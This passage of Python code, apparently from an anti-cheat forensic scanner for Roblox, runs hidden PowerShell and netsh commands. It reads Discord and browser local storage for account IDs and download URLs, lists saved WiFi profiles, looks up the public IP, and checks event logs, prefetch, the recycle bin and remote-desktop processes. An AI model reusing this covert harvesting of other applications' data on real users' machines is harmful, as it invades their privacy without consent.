        si=subprocess.STARTUPINFO(); si.dwFlags=subprocess.STARTF_USESHOWWINDOW; si.wShowWindow=0
        out=subprocess.run(["powershell","-NoProfile","-NonInteractive","-Command",
                            "Get-NetAdapter | Select-Object Name,InterfaceDescription,Status | ConvertTo-Csv -NoTypeInformation"],
                           capture_output=True,text=True,timeout=10,
                           creationflags=subprocess.CREATE_NO_WINDOW, startupinfo=si)
        vpn_adapters=[]
        for line in out.stdout.splitlines()[1:]:
            line=line.strip().strip('"')
            ll=line.lower()
            if any(k in ll for k in vpn_adapter_keywords):
                vpn_adapters.append(line)
                vpn_detected=True
        if vpn_adapters:
            lines.append(f"⚠ VPN ADAPTER(S) DETECTED ({len(vpn_adapters)}):")
            for a in vpn_adapters: lines.append(f"  ✗ {a}")
        else:
            lines.append("  ✓ No VPN adapters detected")
    except Exception: pass
    try:
        req=urllib.request.Request("https://ipinfo.io/json",headers={"User-Agent":"ZevoraScanner/4.0"})
        with urllib.request.urlopen(req,context=_ssl_ctx(),timeout=5) as r:
            ip_data=json.loads(r.read().decode())
        org=ip_data.get("org","Unknown")
        city=ip_data.get("city","?"); country=ip_data.get("country","?")
        ip=ip_data.get("ip","?")
        is_vpn_org=any(k in org.lower() for k in ["vpn","mullvad","nordvpn","hosting","cloud","linode","digitalocean","vultr","ovh","hetzner"])
        lines.append(f"\n  IP Address : {ip}")
        lines.append(f"  Location   : {city}, {country}")
        lines.append(f"  ISP/Org    : {org}")
        if is_vpn_org:
            lines.append("  ⚠ ISP looks like a VPN/hosting provider")
            vpn_detected=True
        vpn_info_str=f"IP:{ip} | {city},{country} | {org}"
    except Exception:
        lines.append("  IP info unavailable")
        vpn_info_str="IP lookup failed"
    try:
        si=subprocess.STARTUPINFO(); si.dwFlags=subprocess.STARTF_USESHOWWINDOW; si.wShowWindow=0
        out=subprocess.run(["netsh","wlan","show","profiles"],
                           capture_output=True,text=True,timeout=8,
                           creationflags=subprocess.CREATE_NO_WINDOW, startupinfo=si)
        ssids=re.findall(r"All User Profile\s*:\s*(.+)",out.stdout)
        ssids=[s.strip() for s in ssids if s.strip()]
        if ssids:
            lines.append(f"\n  WiFi Profiles saved ({len(ssids)}):")
            for s in ssids[:20]: lines.append(f"  ► {s}")
        else:
            lines.append("\n  No WiFi profiles found (ethernet only or profiles cleared)")
    except Exception: pass
    return section("Network / VPN Detection",lines),(1 if vpn_detected else 0),vpn_info_str


def scan_discord_cache():
    if not WINDOWS: return section("Discord Detection",["Windows only"]),0,[]
    import subprocess
    accounts=[]; seen_ids=set()
    ID_RE    = re.compile(r'"id"\s*:\s*"(\d{17,19})"')
    NAME_RE  = re.compile(r'"username"\s*:\s*"([^"]{2,32})"')
    SWITCH_RE= re.compile(r'"lastSwitched"\s*:\s*"?(\d+)"?')
    # NOTE: token/credential regex matching was intentionally removed here.
    # Pattern-matching JWT/MFA auth token formats in another application's
    # local storage is functionally identical to what a credential stealer
    # does, regardless of intent — it's the single hardest thing to defend
    # to an AV engine or to anyone reading the source, and it isn't needed
    # for the legitimate forensic goal (identifying which Discord accounts
    # have been used on this PC), which only needs the account ID/username.

    def parse_leveldb(base_path, source_label):
        if not os.path.exists(base_path): return
        for fname in os.listdir(base_path):
            if not (fname.endswith(".ldb") or fname.endswith(".log") or fname.endswith(".ldb~")): continue
            fpath = os.path.join(base_path, fname)
            try:
                with open(fpath,"rb") as f: raw = f.read().decode("utf-8",errors="ignore")
                ids    = ID_RE.findall(raw)
                names  = NAME_RE.findall(raw)
                switches = SWITCH_RE.findall(raw)
                for i, uid in enumerate(ids):
                    if uid in seen_ids: continue
                    seen_ids.add(uid)
                    uname = names[i] if i < len(names) else (names[0] if names else "Unknown")
                    last_sw = "Unknown"
                    if switches:
                        try:
                            ts = int(switches[0])
                            if ts > 1e12: ts = ts//1000
                            last_sw = datetime.datetime.fromtimestamp(ts).strftime("%Y-%m-%d %H:%M:%S")
                        except Exception: pass
                    accounts.append({
                        "id":uid, "username":uname,
                        "last_switched": last_sw,
                        "source": source_label,
                        "email": None,
                    })
            except Exception: pass

    app_bases = [
        (os.path.expanduser(r"~\AppData\Roaming\discord\Local Storage\leveldb"),       "Discord App"),
        (os.path.expanduser(r"~\AppData\Roaming\discordptb\Local Storage\leveldb"),    "Discord PTB"),
        (os.path.expanduser(r"~\AppData\Roaming\discordcanary\Local Storage\leveldb"), "Discord Canary"),
        (os.path.expanduser(r"~\AppData\Local\Discord\Local Storage\leveldb"),         "Discord (Local)"),
    ]
    for path, label in app_bases:
        parse_leveldb(path, label)

    browser_paths = [
        (r"~\AppData\Local\Google\Chrome\User Data\Default\Local Storage\leveldb",        "Chrome"),
        (r"~\AppData\Local\Microsoft\Edge\User Data\Default\Local Storage\leveldb",       "Edge"),
        (r"~\AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\Local Storage\leveldb", "Brave"),
        (r"~\AppData\Roaming\Opera Software\Opera Stable\Local Storage\leveldb",            "Opera"),
        (r"~\AppData\Roaming\Opera Software\Opera GX Stable\Local Storage\leveldb",         "Opera GX"),
    ]
    for rel_path, label in browser_paths:
        parse_leveldb(os.path.expanduser(rel_path), label)

    real_accounts = [a for a in accounts if a["id"] not in ("REG_TRACE","CRED_MANAGER")]
    lines=[f"\n  Total accounts: {len(real_accounts)}",""]
    for acc in real_accounts:
        lines.append(f"  @{acc['username']}")
        lines.append(f"  ID           : {acc['id']}")
        lines.append(f"  Last Switched: {acc['last_switched']}")
        lines.append(f"  Found in     : {acc['source']}")
        lines.append("  "+"─"*32)
    if len(real_accounts)>1:
        lines.append(f"\n⚠ {len(real_accounts)} DISCORD ACCOUNTS — possible alt accounts")
    if not real_accounts:
        lines.append("  No Discord accounts found.")
    return section("Discord Account Detection",lines), max(0,len(real_accounts)-1), real_accounts


def scan_discord_memory():
    if not WINDOWS: return section("Discord Memory/Downloads",["Windows only"]),0,[]
    hits=[]; download_entries=[]; suspicious_entries=[]
    DISCORD_ROOTS = [
        os.path.expanduser(r"~\AppData\Roaming\discord"),
        os.path.expanduser(r"~\AppData\Roaming\discordptb"),
        os.path.expanduser(r"~\AppData\Roaming\discordcanary"),
    ]
    CHEAT_EXTS = {".exe",".dll",".lua",".luac",".rbxl",".rbxlx",".zip",".rar",".7z"}
    CHEAT_NAMES_RE = re.compile(
        r"(exploit|inject|cheat|hack|aimbot|executor|script|payload|bypass|"
        r"volt|synapse|velocity|fluxus|krnl|delta|wave|scriptware|"
        r"froststrap|aimlock|esp|triggerbot|noclip|speedhack)",
        re.IGNORECASE)
    CDN_RE = re.compile(r"https://cdn[.]discordapp[.]com/attachments/(\d+)/(\d+)/([^\s]{2,120})")

    def snowflake_to_dt(snowflake):
        try:
            ts_ms = (int(snowflake) >> 22) + 1420070400000
            return datetime.datetime.utcfromtimestamp(ts_ms/1000).strftime("%Y-%m-%d %H:%M:%S UTC")
        except Exception:
            return "Unknown"

    def scan_leveldb_dir(base_path, label):
        if not os.path.exists(base_path): return
        try:
            for fname in os.listdir(base_path):
                if not (fname.endswith(".ldb") or fname.endswith(".log")): continue
                fpath = os.path.join(base_path, fname)
                try:
                    with open(fpath,"rb") as f: raw = f.read(4*1024*1024)
                    text = raw.decode("utf-8", errors="ignore")
                    for m in CDN_RE.finditer(text):
                        channel_id, msg_id, filename = m.group(1), m.group(2), m.group(3)
                        clean_fn = filename.split("?")[0].strip()
                        ts = snowflake_to_dt(msg_id)
                        ext = os.path.splitext(clean_fn)[1].lower()
                        is_sus = ext in CHEAT_EXTS or bool(CHEAT_NAMES_RE.search(clean_fn))
                        entry = {"file":clean_fn,"channel":channel_id,"msg_id":msg_id,
                                 "timestamp":ts,"url":m.group(0).split("?")[0],
                                 "source":label,"suspicious":is_sus}
                        download_entries.append(entry)
                        if is_sus: suspicious_entries.append(entry)
                except Exception: pass
        except Exception: pass

    for root in DISCORD_ROOTS:
        label = os.path.basename(root)
        scan_leveldb_dir(os.path.join(root,"Local Storage","leveldb"), label)

    seen_urls = set(); unique_downloads = []
    for e in download_entries:
        if e["url"] not in seen_urls:
            seen_urls.add(e["url"]); unique_downloads.append(e)

    seen_sus = set(); unique_sus = []
    for e in suspicious_entries:
        if e["url"] not in seen_sus:
            seen_sus.add(e["url"]); unique_sus.append(e)

    lines = [f"\n  Discord CDN files found: {len(unique_downloads)}",
             f"  Suspicious entries    : {len(unique_sus)}",""]
    if unique_sus:
        lines.append("⚠ SUSPICIOUS DOWNLOADS (cheat-related files):")
        for e in unique_sus[:20]:
            lines.append(f"  ✗ File     : {e['file']}")
            lines.append(f"    Uploaded : {e['timestamp']}")
            lines.append(f"    URL      : {e['url']}")
            lines.append("")
    if not unique_downloads:
        lines.append("  No Discord CDN file history found.")
    return section("Discord Downloads/Memory", lines), len(unique_sus), unique_downloads


def scan_fastflags():
    """
    FastFlag detection — flags ANY active FastFlag found.
    Zero tolerance: all flags are treated equally.
    """
    all_flags   = {}
    sources_hit = []

    json_paths = [
        os.path.expanduser(r"~\AppData\Local\Roblox\ClientSettings\ClientAppSettings.json"),
        os.path.expandvars(r"%LOCALAPPDATA%\Bloxstrap\Modifications\ClientSettings\ClientAppSettings.json"),
        os.path.expandvars(r"%LOCALAPPDATA%\Bloxstrap\ClientSettings\ClientAppSettings.json"),
        os.path.expandvars(r"%LOCALAPPDATA%\Froststrap\ClientSettings\ClientAppSettings.json"),
        os.path.expandvars(r"%LOCALAPPDATA%\Fishstrap\ClientSettings\ClientAppSettings.json"),
        os.path.expandvars(r"%LOCALAPPDATA%\Voidstrap\ClientSettings\ClientAppSettings.json"),
        os.path.expandvars(r"%LOCALAPPDATA%\Davestrap\ClientSettings\ClientAppSettings.json"),
    ]
    for jp in json_paths:
        if not os.path.exists(jp): continue
        try:
            with open(jp, "r", encoding="utf-8", errors="ignore") as f:
                data = json.loads(f.read())
            if isinstance(data, dict) and data:
                all_flags.update(data)
                sources_hit.append(os.path.basename(os.path.dirname(jp)))
        except Exception:
            pass

    log_dirs = [
        os.path.expanduser(r"~\AppData\Local\Roblox\logs"),
        os.path.expandvars(r"%LOCALAPPDATA%\Bloxstrap\Logs"),
        os.path.expandvars(r"%LOCALAPPDATA%\Davestrap\Logs"),
        os.path.expandvars(r"%LOCALAPPDATA%\Froststrap\Logs"),
        os.path.expandvars(r"%LOCALAPPDATA%\Voidstrap\Logs"),
        os.path.expandvars(r"%LOCALAPPDATA%\Fishstrap\Logs"),
    ]
    log_username = "Unknown"
    log_placeid  = ""
    for log_dir in log_dirs:
        if not os.path.exists(log_dir): continue
        try:
            log_files = sorted(
                glob.glob(os.path.join(log_dir, "*.log")) +
                glob.glob(os.path.join(log_dir, "*.txt")),
                key=lambda f: os.path.getmtime(f), reverse=True)[:10]
        except Exception:
            continue
        for fpath in log_files:
            try:
                with open(fpath, "r", encoding="utf-8", errors="ignore") as f:
                    raw = f.read(500000)
            except Exception:
                continue
            um = re.search(r'"UserName"%3a"([A-Za-z0-9_]{3,20})"', raw)
            if um and log_username == "Unknown":
                log_username = um.group(1)
            pm = re.search(r'placeId=(\d{6,15})', raw)
            if pm and not log_placeid:
                log_placeid = pm.group(1)
            lcs_idx = raw.find("LoadClientSettings")
            if lcs_idx == -1: continue
            brace = raw.find("{", lcs_idx)
            if brace == -1: continue
            chunk = raw[brace:brace+60000]
            depth = 0; end = 0
            for i, ch in enumerate(chunk):
                if ch == "{": depth += 1
                elif ch == "}":
                    depth -= 1
                    if depth == 0: end = i+1; break
            if end < 10: continue
            try:
                flags_from_log = json.loads(chunk[:end])
                if isinstance(flags_from_log, dict) and flags_from_log:
                    all_flags.update(flags_from_log)
                    sources_hit.append(f"log:{os.path.basename(fpath)[:40]}")
                    break
            except Exception:
                for line in chunk[:end].splitlines():
                    m = re.match(r'\s*"([^"]+)"\s*:\s*"?([^",}\n]+)"?', line)
                    if m:
                        all_flags[m.group(1)] = m.group(2).strip().strip('"')

    lines = [
        f"\n  Username  : {log_username}",
        f"  Place ID  : {'https://www.roblox.com/games/'+log_placeid if log_placeid else 'Unknown'}",
        f"  Sources   : {', '.join(sources_hit) if sources_hit else 'None found'}",
        f"  Total flags: {len(all_flags)}",
        "",
    ]

    if all_flags:
        lines.append("  ⚠ FLAGGED — FastFlags detected (zero tolerance policy):")
        lines.append("  " + "─"*50)
        for k, v in sorted(all_flags.items()):
            lines.append(f"  ✗ {k} = {v}")
    else:
        lines.append("  ✓ CLEAN — No FastFlags detected.")

    flagged_list = [f"{k} = {v}" for k, v in all_flags.items()]
    return section("FastFlag Detection", lines), len(all_flags), flagged_list


def scan_event_log():
    if not WINDOWS:
        return section("Event Log", ["Windows only"]), 0, []
    import ctypes
    hits = []; flags = []
    is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
    try:
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,
                             r"SYSTEM\CurrentControlSet\Services\EventLog",
                             0, winreg.KEY_READ | winreg.KEY_WOW64_64KEY)
        start, _ = winreg.QueryValueEx(key, "Start")
        winreg.CloseKey(key)
        if start == 4:
            flags.append("CRITICAL: EventLog SERVICE DISABLED — all logging suppressed")
            hits.append("service_disabled")
    except Exception: pass

    for lg, min_entries, weight in [("Security",10,5),("System",20,3),("Application",10,2)]:
        try:
            si = subprocess.STARTUPINFO()
            si.dwFlags = subprocess.STARTF_USESHOWWINDOW; si.wShowWindow = 0
            out = subprocess.run(
                ["powershell","-NoProfile","-NonInteractive","-Command",
                 f'(Get-WinEvent -ListLog "{lg}" -EA SilentlyContinue).RecordCount'],
                capture_output=True, text=True, timeout=10,
                creationflags=subprocess.CREATE_NO_WINDOW, startupinfo=si)
            count = int(out.stdout.strip()) if out.stdout.strip().isdigit() else -1
            if count == 0:
                flags.append(f"CRITICAL: {lg} log has 0 entries — CLEARED")
                for _ in range(weight): hits.append(f"{lg}_cleared")
            elif 0 < count < min_entries:
                flags.append(f"WARNING: {lg} log only {count} entries — possibly cleared")
                hits.append(f"{lg}_low")
        except Exception: pass

    for eid, src in [(1102,"Security"),(104,"System")]:
        try:
            si = subprocess.STARTUPINFO()
            si.dwFlags = subprocess.STARTF_USESHOWWINDOW; si.wShowWindow = 0
            out = subprocess.run(
                ["wevtutil","qe",src,f"/q:*[System[EventID={eid}]]","/c:3","/f:text"],
                capture_output=True, text=True, timeout=8,
                creationflags=subprocess.CREATE_NO_WINDOW, startupinfo=si)
            if out.stdout.strip():
                ts_lines = [l.strip() for l in out.stdout.splitlines() if "Date" in l or "Time" in l]
                when = ts_lines[0] if ts_lines else "unknown time"
                flags.append(f"CRITICAL: {src} log CLEARED (EID {eid}) — {when}")
                hits.append(f"log_clear_{src}")
        except Exception: pass

    lines = [f"\n  Admin: {'Yes' if is_admin else 'No (limited)'}"]
    for f in flags:
        sym = "✗" if "CRITICAL" in f else "⚠"
        lines.append(f"  {sym} {f}")
    if not flags: lines.append("  ✓ Event logs appear normal")
    return section("Event Log Analysis", lines), len(hits), hits


def scan_jumplists():
    if not WINDOWS:
        return section("Jump Lists", ["Windows only"]), 0, []
    hits = []
    for jd in [
        os.path.expanduser(r"~\AppData\Roaming\Microsoft\Windows\Recent\AutomaticDestinations"),
        os.path.expanduser(r"~\AppData\Roaming\Microsoft\Windows\Recent\CustomDestinations"),
    ]:
        if not os.path.exists(jd): continue
        try:
            for fname in os.listdir(jd):
                fpath = os.path.join(jd, fname)
                try:
                    with open(fpath,"rb") as f: raw = f.read()
                    text = raw.decode("utf-16-le",errors="ignore")+raw.decode("latin-1",errors="ignore")
                    kws = matches_keyword(text)
                    if kws: hits.append({"file":fname,"keywords":kws})
                except Exception: pass
        except Exception: pass
    lines = [f"\n  Jump list hits: {len(hits)}"]
    for h in hits: lines.append(f"  ⚠ {h['file']}  [{', '.join(h['keywords'])}]")
    if not hits: lines.append("  ✓ No cheat-related jump list entries")
    return section("Jump Lists", lines), len(hits), hits


def scan_lnk_files():
    if not WINDOWS:
        return section("LNK Files", ["Windows only"]), 0, []
    hits = []
    for ld in [
        os.path.expanduser(r"~\AppData\Roaming\Microsoft\Windows\Recent"),
        os.path.expanduser("~\\Desktop"),
        os.path.expanduser("~\\Downloads"),
    ]:
        if not os.path.exists(ld): continue
        for fname in os.listdir(ld):
            if not fname.lower().endswith(".lnk"): continue
            fpath = os.path.join(ld, fname)
            try:
                with open(fpath,"rb") as f: raw = f.read()
                text = raw.decode("utf-16-le",errors="ignore")+raw.decode("latin-1",errors="ignore")
                kws = matches_keyword(text)
                if kws:
                    mt = datetime.datetime.fromtimestamp(os.stat(fpath).st_mtime).strftime("%Y-%m-%d %H:%M")
                    hits.append({"file":fname,"path":fpath,"keywords":kws,"modified":mt})
            except Exception: pass
    lines = [f"\n  LNK hits: {len(hits)}"]
    for h in hits:
        lines.append(f"  ⚠ {h['file']}  |  {h['modified']}")
        lines.append(f"    [{', '.join(h['keywords'])}]")
    if not hits: lines.append("  ✓ No suspicious LNK files")
    return section("LNK Files", lines), len(hits), hits


def scan_deleted_integrity():
    if not WINDOWS:
        return section("Deleted Integrity", ["Windows only"]), 0, []
    deleted = []
    pf_dir = r"C:\Windows\Prefetch"
    if os.path.exists(pf_dir):
        for pf in glob.glob(os.path.join(pf_dir,"*.pf")):
            name = os.path.basename(pf).rsplit("-",1)[0]
            kws = matches_keyword(name)
            if kws:
                try:
                    with open(pf,"rb") as f: raw = f.read(4096)
                    paths = re.findall(r"C:[/\\][^\x00]{3,80}", raw.decode("utf-16-le",errors="ignore"))
                    full = paths[-1].strip() if paths else name
                except Exception: full = name
                if not os.path.exists(full):
                    deleted.append({"name":name,"path":full,"source":"Prefetch","keywords":kws})
    rb = "C:\\$Recycle.Bin"
    if os.path.exists(rb):
        for root, dirs, files in os.walk(rb):
            i_files = {f[2:]: os.path.join(root,f) for f in files if f.startswith("$I")}
            r_files = {f[2:] for f in files if f.startswith("$R")}
            for suffix, ipath in i_files.items():
                if suffix not in r_files:
                    kws = matches_keyword(suffix)
                    if kws:
                        deleted.append({"name":"$I"+suffix,"path":ipath,"source":"Recycle Bin","keywords":kws})
    lines = [f"\n  Deleted evidence: {len(deleted)}"]
    for d in deleted:
        lines.append(f"  ⚠ {d['name']}\n    {d['path']}\n    {d['source']} | {', '.join(d['keywords'])}")
    if not deleted: lines.append("  ✓ No deleted cheat evidence")
    return section("Deleted File Integrity", lines), len(deleted), deleted


def scan_power_events():
    if not WINDOWS:
        return section("Logon/Logoff Sessions", ["Windows only"]), 0, []
    import subprocess
    si = subprocess.STARTUPINFO()
    si.dwFlags = subprocess.STARTF_USESHOWWINDOW; si.wShowWindow = 0
    DAYS = 15
    ps_cmd = f"""
$days = {DAYS}
$cutoff = (Get-Date).AddDays(-$days)
$logons  = @()
$logoffs = @()
try {{
    $evts = Get-WinEvent -FilterHashtable @{{LogName='Security';Id=@(4624,4634,4647);StartTime=$cutoff}} -MaxEvents 2000 -ErrorAction SilentlyContinue
    foreach($e in $evts) {{
        if($e.Id -eq 4624) {{
            $lt = $e.Properties[8].Value
            if($lt -in @(2,7,10,11)) {{ $logons += $e.TimeCreated }}
        }} elseif($e.Id -in @(4634,4647)) {{ $logoffs += $e.TimeCreated }}
    }}
}} catch {{}}
$logons  = $logons  | Sort-Object
$logoffs = $logoffs | Sort-Object
$used_offs = @{{}}
foreach($on in $logons) {{
    $matched = $null
    foreach($off in $logoffs) {{
        if($off -gt $on -and -not $used_offs.ContainsKey($off.Ticks)) {{
            $matched = $off
            $used_offs[$off.Ticks] = 1
            break
        }}
    }}
    if($matched) {{
        $dur = [int]($matched - $on).TotalMinutes
        Write-Output "$($on.ToString('yyyy-MM-dd HH:mm:ss'))|$($matched.ToString('yyyy-MM-dd HH:mm:ss'))|$dur"
    }} else {{
        Write-Output "$($on.ToString('yyyy-MM-dd HH:mm:ss'))||ACTIVE"
    }}
}}
"""
    raw_sessions = []
    try:
        out = subprocess.run(
            ["powershell","-NoProfile","-NonInteractive","-Command", ps_cmd],
            capture_output=True, text=True, timeout=25,
            creationflags=subprocess.CREATE_NO_WINDOW, startupinfo=si)
        for line in out.stdout.strip().splitlines():
            line = line.strip()
            if not line or "|" not in line: continue
            parts = line.split("|", 2)
            if len(parts) < 3: continue
            on_str, off_str, dur_str = parts
            try: on_dt = datetime.datetime.strptime(on_str, "%Y-%m-%d %H:%M:%S")
            except Exception: continue
            off_dt = None
            if off_str.strip():
                try: off_dt = datetime.datetime.strptime(off_str.strip(), "%Y-%m-%d %H:%M:%S")
                except Exception: pass
            dur_min = -1
            try: dur_min = int(dur_str.strip())
            except Exception: pass
            raw_sessions.append({"on": on_dt, "off": off_dt, "dur_min": dur_min})
    except Exception: pass

    def fmt_dur(m):
        if m < 0: return ""
        if m < 60: return f"({m}m)"
        h,mm = m//60, m%60
        return f"({h}h {mm}m)" if mm else f"({h}h)"

    from collections import defaultdict
    def date_key(dt):
        s = dt.strftime("%B %d, %Y")
        parts = s.split(" ")
        if len(parts) == 3 and parts[1].startswith("0"):
            parts[1] = parts[1][1:]
        return " ".join(parts)

    by_date = defaultdict(list)
    for s in raw_sessions:
        by_date[date_key(s["on"])].append(s)

    def parse_date(d):
        try: return datetime.datetime.strptime(d, "%B %d, %Y")
        except Exception: return datetime.datetime.min
    sorted_dates = sorted(by_date.keys(), key=parse_date, reverse=True)

    total = len(raw_sessions)
    lines = [f"\n  Logon/Logoff History: {total} session(s) (past {DAYS} days)", "  " + "="*50]
    if not raw_sessions:
        lines.append("  ⚠ No session data — Security log may be cleared or auditing disabled.")
    else:
        for date_str in sorted_dates:
            lines.append(f"\n  --- {date_str} ---")
            sessions_for_day = sorted(by_date[date_str], key=lambda x:x["on"], reverse=True)
            for s in sessions_for_day:
                on_t = s["on"].strftime("%H:%M:%S")
                if s["off"] is None or s["dur_min"] < 0:
                    lines.append(f"  Logon {on_t} -> Active now")
                else:
                    off_t = s["off"].strftime("%H:%M:%S")
                    lines.append(f"  Logon {on_t} -> Logoff {off_t}  {fmt_dur(s['dur_min'])}")
    lines.append("\n  " + "="*50)
    warnings = 1 if not raw_sessions else 0
    return section("Logon/Logoff Sessions", lines), warnings, raw_sessions


def scan_two_pc_indicators():
    if not WINDOWS:
        return section("2-PC / Stream Bypass Detection", ["Windows only"]), 0, []
    import subprocess
    hits = []; warnings = []
    si = subprocess.STARTUPINFO()
    si.dwFlags = subprocess.STARTF_USESHOWWINDOW; si.wShowWindow = 0

    try:
        out = subprocess.run(
            ["powershell","-NoProfile","-NonInteractive","-Command",
             "Get-WmiObject Win32_VideoController | Select-Object Name,AdapterRAM,CurrentHorizontalResolution,CurrentVerticalResolution | ConvertTo-Csv -NoTypeInformation"],
            capture_output=True, text=True, timeout=8,
            creationflags=subprocess.CREATE_NO_WINDOW, startupinfo=si)
        for line in out.stdout.splitlines()[1:]:
            line = line.strip().strip('"')
            ll = line.lower()
            if any(x in ll for x in ["virtual","display only","basic display","indirect","idd ","parsec","sunshine","moonlight","nvfbc","amf"]):
                hits.append(f"VIRTUAL DISPLAY: {line[:100]}")
                warnings.append(f"Virtual/headless display adapter detected: {line[:80]}")
    except Exception: pass

    STREAM_PROCS = {
        "parsec":"Parsec — remote gaming/stream software",
        "sunshine":"Sunshine — game streaming server",
        "moonlight":"Moonlight — game streaming client",
        "anydesk":"AnyDesk — remote desktop",
        "teamviewer":"TeamViewer — remote desktop",
        "rustdesk":"RustDesk — remote desktop",
        "nvstreamer":"NVIDIA GameStream",
        "spacedesk":"Spacedesk — virtual display driver",
    }
    try:
        out = subprocess.run(
            ["powershell","-NoProfile","-NonInteractive","-Command","Get-Process | Select-Object -ExpandProperty Name"],
            capture_output=True, text=True, timeout=8,
            creationflags=subprocess.CREATE_NO_WINDOW, startupinfo=si)
        running = {p.strip().lower() for p in out.stdout.splitlines() if p.strip()}
        for proc, desc in STREAM_PROCS.items():
            if any(proc in r for r in running):
                hits.append(f"RUNNING: {desc}")
                warnings.append(f"⚠ {desc} is running")
    except Exception: pass

    lines = [f"\n  2-PC / Stream indicators: {len(hits)}", ""]
    if not hits:
        lines.append("  ✓ No dual-PC streaming indicators detected")
    else:
        for w in warnings: lines.append(f"  {w}")
        lines.append("")
        for h in hits: lines.append(f"  ► {h}")
    return section("2-PC / Stream Bypass Detection", lines), len(warnings), hits


def scan_deleted_cheat_recovery():
    if not WINDOWS:
        return section("Deleted Cheat Recovery", ["Windows only"]), 0, []
    recovered = []
    desktop = os.path.join(os.path.expanduser("~"), "Desktop")
    out_dir  = os.path.join(desktop, "zevoraRecovered")

    rb_root = "C:\\$Recycle.Bin"
    if os.path.exists(rb_root):
        try:
            for root, dirs, files in os.walk(rb_root):
                for f in files:
                    if not f.upper().startswith("$I"): continue
                    ipath = os.path.join(root, f)
                    try:
                        with open(ipath, "rb") as fp: data = fp.read(1100)
                        if len(data) < 28: continue
                        del_ft  = struct.unpack_from("<Q", data, 16)[0]
                        del_dt  = filetime_to_dt(del_ft)
                        del_str = del_dt.strftime("%Y-%m-%d %H:%M:%S") if del_dt and del_dt.year > 2000 else "Unknown"
                        orig_path = ""
                        if len(data) >= 32:
                            try:
                                path_len = struct.unpack_from("<I", data, 28)[0]
                                if 2 <= path_len <= 520:
                                    path_bytes = data[32:32 + path_len * 2]
                                    candidate  = path_bytes.decode("utf-16-le", errors="ignore").rstrip("\x00")
                                    if candidate.startswith(("C:\\","D:\\","E:\\")):
                                        orig_path = candidate
                            except Exception: pass
                        if not orig_path and len(data) >= 548:
                            try:
                                candidate = data[28:548].decode("utf-16-le", errors="ignore").rstrip("\x00").split("\x00")[0]
                                if candidate.startswith(("C:\\","D:\\","E:\\")):
                                    orig_path = candidate
                            except Exception: pass
                        if not orig_path: continue
                        kws = matches_keyword(orig_path)
                        if kws:
                            recovered.append({
                                "filename": os.path.basename(orig_path),
                                "original_path": orig_path,
                                "deleted_at": del_str,
                                "keywords": kws,
                                "source": "Recycle Bin ($I metadata)",
                            })
                    except Exception: pass
        except Exception: pass

    pf_dir = r"C:\Windows\Prefetch"
    if os.path.exists(pf_dir):
        for pf in glob.glob(os.path.join(pf_dir, "*.pf")):
            name = os.path.basename(pf).rsplit("-", 1)[0]
            kws  = matches_keyword(name)
            if not kws: continue
            try:
                with open(pf, "rb") as f: raw = f.read(4096)
                decoded = raw.decode("utf-16-le", errors="ignore")
                paths = re.findall(r"C:[/\\][^\x00]{3,120}", decoded)
                full  = paths[-1].strip() if paths else f"C:\\...\\{name}"
            except Exception: full = f"C:\\...\\{name}"
            if not os.path.exists(full):
                mt = datetime.datetime.fromtimestamp(os.path.getmtime(pf)).strftime("%Y-%m-%d %H:%M:%S")
                recovered.append({
                    "filename": os.path.basename(full),
                    "original_path": full,
                    "deleted_at": f"Last executed: {mt}",
                    "keywords": kws,
                    "source": "Prefetch (no longer on disk)",
                })

    seen = set(); unique_rec = []
    for r in recovered:
        k = r["filename"].lower()
        if k not in seen:
            seen.add(k); unique_rec.append(r)

    if unique_rec:
        try:
            os.makedirs(out_dir, exist_ok=True)
            rpt = os.path.join(out_dir, "recovery_report.txt")
            with open(rpt, "w", encoding="utf-8") as fp:
                fp.write("zevora — DELETED CHEAT EVIDENCE\n")
                fp.write(f"Generated : {now_str()}\nPC User   : {current_user()}\n" + "=" * 60 + "\n\n")
                for i, r in enumerate(unique_rec, 1):
                    fp.write(f"[{i}] {r['filename']}\n  Path     : {r['original_path']}\n")
                    fp.write(f"  Deleted  : {r['deleted_at']}\n  Source   : {r['source']}\n")
                    fp.write(f"  Keywords : {', '.join(r['keywords'])}\n\n")
        except Exception: pass

    lines = [f"\n  Deleted cheat evidence found: {len(unique_rec)}", ""]
    if unique_rec:
        lines.append(f"  ⚠ Report saved to: {out_dir}\\recovery_report.txt\n")
        for r in unique_rec:
            lines.append(f"  ✗ {r['filename']}")
            lines.append(f"    Path    : {r['original_path']}")
            lines.append(f"    Deleted : {r['deleted_at']}")
            lines.append(f"    Source  : {r['source']}")
            lines.append(f"    Keywords: {', '.join(r['keywords'])}")
            lines.append("")
    else:
        lines.append("  ✓ No deleted cheat evidence found.")
    return section("Deleted Cheat Recovery", lines), len(unique_rec), unique_rec


def scan_execution_history():
    if not WINDOWS:
        return section("Execution History", ["Windows only"]), 0, []
    import subprocess, tempfile
    today = datetime.date.today()
    entries = []; seen = set()
    SYSTEM_SKIP = {"windows\\system32","windows\\syswow64","windows\\winsxs","programdata\\microsoft","windowsapps","\\drivers\\"}

    def is_system(p): return any(s in p.lower() for s in SYSTEM_SKIP)
    def flag_check(path):
        reasons = list(matches_keyword(path))
        pl = path.lower()
        if "\\appdata\\local\\temp\\" in pl: reasons.append("Temp dir EXE")
        if "\\appdata\\roaming\\" in pl and pl.endswith(".exe"): reasons.append("Roaming EXE")
        if not os.path.exists(path): reasons.append("File deleted")
        return reasons

    pf_dir = r"C:\Windows\Prefetch"
    try:
        for pf in glob.glob(os.path.join(pf_dir,"*.pf")):
            try:
                mt = datetime.datetime.fromtimestamp(os.stat(pf).st_mtime)
                if mt.date() != today: continue
                name = os.path.basename(pf).rsplit("-",1)[0]
                try:
                    with open(pf,"rb") as f: raw = f.read(4096)
                    paths = re.findall(r"C:[/\\][^\x00]{3,80}", raw.decode("utf-16-le",errors="ignore"))
                    full = paths[-1].strip() if paths else f"C:\\...\\{name}"
                except Exception: full = f"C:\\...\\{name}"
                if full.lower() in seen or is_system(full): continue
                seen.add(full.lower())
                reasons = flag_check(full)
                entries.append({"path":full,"name":name,"time":mt.strftime("%H:%M:%S"),
                                 "source":"Prefetch","flagged":bool(reasons),"reasons":reasons})
            except Exception: continue
    except Exception: pass

    entries.sort(key=lambda e: e.get("time",""), reverse=True)
    flagged_cnt = sum(1 for e in entries if e["flagged"])
    lines = [f"\n  Today: {len(entries)} total ({flagged_cnt} flagged)"]
    for e in entries:
